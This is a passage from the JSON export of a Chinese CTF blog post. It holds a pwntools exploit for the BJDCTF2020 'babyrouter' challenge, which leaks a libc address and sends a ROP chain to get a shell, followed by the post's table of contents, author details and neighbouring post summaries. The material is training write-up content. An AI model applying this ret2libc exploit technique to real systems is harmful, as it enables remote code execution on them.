class=\"number\">0x28</span>+p64(ret)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"EXP-4\"><a href=\"#EXP-4\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./babyrouter&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28044</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./babyrouter&#x27;</span>)</span><br><span class=\"line\">puts_plt=elf.plt[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">puts_got=elf.got[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">start_addr=elf.symbols[<span class=\"string\">&quot;_start&quot;</span>]</span><br><span class=\"line\">pop_rdi_ret=<span class=\"number\">0x000400733</span></span><br><span class=\"line\">ret = <span class=\"number\">0x4004c9</span></span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;Pull up your sword and tell me u story!&#x27;</span>,payload1)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">puts_addr=u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&quot;puts&quot;</span>,puts_addr)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class=\"line\">libcbase=puts_addr-libc.dump(<span class=\"string\">&quot;puts&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#system_addr = libcbase + libc.sym[&#x27;system&#x27;]</span></span><br><span class=\"line\">system_addr=libcbase+libc.dump(<span class=\"string\">&quot;system&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#binsh_addr = libcbase + libc.search(&#x27;/bin/sh\\0&#x27;).next()</span></span><br><span class=\"line\">binsh_addr=libcbase+libc.dump(<span class=\"string\">&quot;str_bin_sh&quot;</span>)</span><br><span class=\"line\">payload2 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(ret)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;Pull up your sword and tell me u story!&#x27;</span>,payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n","text":"pwn03将附件拖进IDA中很容易发现存在栈溢出，但是没有后门函数以及system函数，也不能利用系统调用 所以函数地址泄露获得libc版本来获得system函数地址从而获得shell。具体步骤： 泄露 puts地址 获取 libc 版本 获取 system 地址与 /bin/s...","link":"","photos":[],"count_time":{"symbolsCount":"9.6k","symbolsTime":"9 mins."},"categories":[{"name":"刷题","slug":"刷题","count":6,"path":"api/categories/刷题.json"}],"tags":[{"name":"pwn","slug":"pwn","count":7,"path":"api/tags/pwn.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#pwn03\"><span class=\"toc-text\">pwn03</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#exp\"><span class=\"toc-text\">exp</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#pwn04\"><span class=\"toc-text\">pwn04</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#pwn07\"><span class=\"toc-text\">pwn07</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-1\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#pwn10\"><span class=\"toc-text\">pwn10</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-2\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E8%90%8C%E6%96%B0%E8%B5%9B-%E7%AD%BE%E5%88%B0%E9%A2%98\"><span class=\"toc-text\">萌新赛-签到题</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%86%85%E9%83%A8%E8%B5%9B-%E7%AD%BE%E5%88%B0%E9%A2%98\"><span class=\"toc-text\">内部赛-签到题</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-3\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#36D%E6%9D%AF-%E7%AD%BE%E5%88%B0\"><span class=\"toc-text\">36D杯-签到</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#BJDCTF2020-babyrouter\"><span class=\"toc-text\">BJDCTF2020-babyrouter</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-4\"><span class=\"toc-text\">EXP</span></a></li></ol></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"西湖论剑pwn复现","uid":"08ca8a643d07b9ceeb8a1eb3cf2f50b4","slug":"西湖论剑pwn复现","date":"2021-11-22T13:19:10.000Z","updated":"2021-11-22T23:24:05.390Z","comments":true,"path":"api/articles/西湖论剑pwn复现.json","keywords":null,"cover":"https://i.loli.net/2021/11/23/3mXuv9PTqLHU726.jpg","text":" 第一次参加西湖论剑，技术不够，一题没出，希望明年能够出个两三道 blind听darry👴说远端的libc被魔改了，对不上，加上没有远端环境，所以我就讲一下本地如何打通的。（全程darry👴讲解） 我一开始没注意到开了NX保护，所以想利用构造read函数让函数跳转执行shellc...","link":"","photos":[],"count_time":{"symbolsCount":"5.8k","symbolsTime":"5 mins."},"categories":[{"name":"PWN","slug":"PWN","count":2,"path":"api/categories/PWN.json"}],"tags":[{"name":"wp","slug":"wp","count":2,"path":"api/tags/wp.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"ctfshow-misc","uid":"050531b15fb9d2cd0cab573b50dcfcd8","slug":"ctfshow-misc","date":"2021-10-16T14:43:36.000Z","updated":"2021-11-06T02:17:54.027Z","comments":true,"path":"api/articles/ctfshow-misc.json","keywords":null,"cover":"https://i.loli.net/2021/10/13/nMZwPpxO8NWJRi4.jpg","text":"misc1签到题，打开就有flag misc2打开txt文件出现一堆乱码，丢进winhex发现是png，直接改后缀名即可 misc3bpg文件使用bpgview工具打开，打开后即可获得flag ","link":"","photos":[],"count_time":{"symbolsCount":98,"symbolsTime":"1 mins."},"categories":[{"name":"刷题","slug":"刷题","count":6,"path":"api/categories/刷题.json"}],"tags":[{"name":"misc","slug":"misc","count":3,"path":"api/tags/misc.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}}}}